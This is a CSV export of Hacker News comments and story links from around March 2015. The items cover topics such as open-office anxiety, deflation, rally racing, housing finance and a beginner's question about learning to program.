ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
9294756,comment,9294704,9294704,0,0,zem,,,"lewis thomas. combined solid science and excellent writing.",1427785158
9294755,comment,9288912,9294290,0,0,ekianjo,,,"Pollutants can be re-treated to be less harmful, or incinerated, or simply dispersed over a large enough surface/volume so that they would not be considered pollutants anymore at low enough concentrations.",1427785139
9294754,comment,9292831,9293532,0,0,shostack,,,"That show was truly prescient in many ways. Man do I miss it.",1427785130
9294753,comment,9292831,9294553,0,0,djur,,,"I have similar problems with anxiety and have come to partial terms with them this way: when I&#x27;m at work, I&#x27;m performing. If part of that performance is dancing around in my chair or putting my head down on the desk or reading irrelevant websites from time to time, so be it. This is my own self-expression. And anyone who gives a shit about it who isn&#x27;t my boss can get fucked.",1427785101
9294752,comment,9289612,9293600,0,0,RobertoG,,,"That’s a very strange way of thinking about money.  Money is valuable but only in the context of an economy.  Your example is true only if the economy didn’t grow that year. You could make the opposite example. You have 100 dollars today and 100 dollars tomorrow but the economy shrinks a 6%, what is the real value of your money?<p>A most interesting way would be see money as infrastructure. In order the economy to work you need money. In order to it work properly you need the proper quantity of money.  Of course we can disagree in what is the proper quantity.",1427785084
9294751,comment,9291015,9293893,0,0,jfarmer,,,"If you&#x27;re curious, the math-y term for an operation that is its own inverse is <i>involution</i>.  I don&#x27;t know that I&#x27;ve ever heard the word in a programming context, but there it is! :)",1427785073
9294749,comment,9292831,9294553,0,0,TeMPOraL,,,"I second this. For me it&#x27;s not even about being watched. It&#x27;s that unnerving feeling of presence of other people that often makes me unable to focus in open-space setting at work. I had that since forever - even as a kid I aways closed the door to my room. I&#x27;m usually the last person to leave the office and when I see a cow-orker of mine staying late I start to feel irritated (saying in my head &quot;hey, this was supposed to be my time for focused work!&quot;).<p>Funny thing is - I&#x27;m not an antisocial person. I <i>love</i> people. Just not when I&#x27;m trying to focus on something. Then the very presence of others makes me nervous.<p>And yes, when I&#x27;m focused, I like to talk to myself out loud, lie down on a couch to think, rock to music and draw a lot (when designing something). All those things look silly and I&#x27;m uncomfortable doing any of it when not alone.",1427784978
9294748,comment,9289612,9293600,0,0,Gurkenmaster,,,"Deflation also causes problems because the value of your money increases over time. Should I spend it today, tomorrow or in 10 years?",1427784971
9294747,comment,9294192,9294666,0,0,hudibras,,,">exploding popularity (hundreds thousands of people lining the stages without the protection of normal circuit racing) and a series of deadly accidents, eventually leading to the end of the Group B category<p>I know next-to-nothing about rally racing, but that last photo in the article must highlight what you&#x27;re talking about: a TV cameraman standing about six feet away from a speeding car on a dirt road. Yikes!",1427784951
9294744,comment,9290289,9293560,0,0,Domenic_S,,,"> <i>I don&#x27;t believe this is the case. Population growth has stopped in the US, and as baby boomers die off you&#x27;re going to see a glut of housing inventory pushing prices down.</i><p>Two words: immigrants and inflation. I think I&#x27;m going to see a $100k minimum wage in my lifetime just from inflation.<p>> <i>The real estate agent/broker advising you is required to act as your fiduciary</i><p>Of course, as far as trying to get the best deal and informing you of property condition and so forth. In context I clearly meant financial fiduciary [edit: I see even that could be mis-read, so in more words: your realtor has no duty to tell you what you can and can&#x27;t afford]. RE agents take great pains to know only what your prequal number is to make sure they stay far away from the possibility of financial fiduciary duty.<p>> <i>Selection bias.</i><p>Perhaps. Whether or not their home was underwater, someone hit by unemployment&#x27;s probably going to end up in that position anyway. Obviously it was all connected; regardless, those instances are not very interesting. As I said elsewhere in the thread, the cases where people are indeed able to pay yet still walk away are interesting to me.",1427784944
9294743,comment,9293849,9294612,0,0,obstinate,,,"It is rather stupid to equate the degree of media manipulation in the West vs. China and Russia.",1427784908
9294742,story,,,1,0,kedargj,"What interview question to ask when hiring a QA Automation Engineer",https://www.gapjumpers.me/questions/chegg/qs-215?utm_campaign=hn&utm_medium=web,,1427784890
9294741,comment,9294192,9294466,0,0,ekianjo,,,"It probably does not catch up there because you&#x27;d need a bunch of policemen to prevent spectators from being run over by cars losing control :)",1427784874
9294740,comment,9293849,9293849,0,0,bsder,,,"So, the real question is how should <i>we</i>, the tech community, react?",1427784862
9294739,comment,9235002,9236110,0,0,cookingrobot,,,"Not really an unresponsive driver - more like an unresponsive passenger.  I bet a lot of people will fall asleep while being driven around.",1427784801
9294738,comment,9293849,9293849,0,0,dante9999,,,"how is it possible that someone can carry this kind of attack without facing any kind of legal consequences? I know they are china we&#x27;re not going to start a war with them but shit is there really no legal authority here?",1427784788
9294736,comment,9290164,9290229,0,0,MichaelCrawford,,,"Write articles that genuine humans will want to read, then recommend to others by linking them.",1427784745
9294735,story,,,2,0,ottjogi,"How to Build a Growth Machine",https://blog.kissmetrics.com/build-a-growth-machine/,,1427784725
9294734,comment,9294704,9294704,0,0,argimenes,,,"Alan Kay<p>Kenneth Clark, art historian<p>John Ruskin, art and social historian<p>Slavoj Zizek, Marxist/Lacanian philosopher",1427784701
9294733,story,,,1,6,vikraman,"Is it possible to learn programming?",,"Hi I am interested to learn Programming.. i am now 24 years old and have a little knowledge about programming.. can I now learn Programming...
If I can. Can you tell me in which order i start to learn and what to do? have any of you some suggestion and notes that can help me?&#x27;<p>tnx for your&#x27;s advice and sorry my Enslgih is not so good:)",1427784685
9294732,comment,9289612,9291306,0,0,Gurkenmaster,,,"> Enjoy television shows that offer multi-month and multi-year arcs and are designed to be consumed by dedicated fans in order, rather than principally for syndication in random order.<p>This has nothing to do with economic or technical limitations. It has cultural reasons. SDF Macross aired in 1982 in Japan with 26 episodes in order and I&#x27;m sure there are even earlier shows.",1427784671
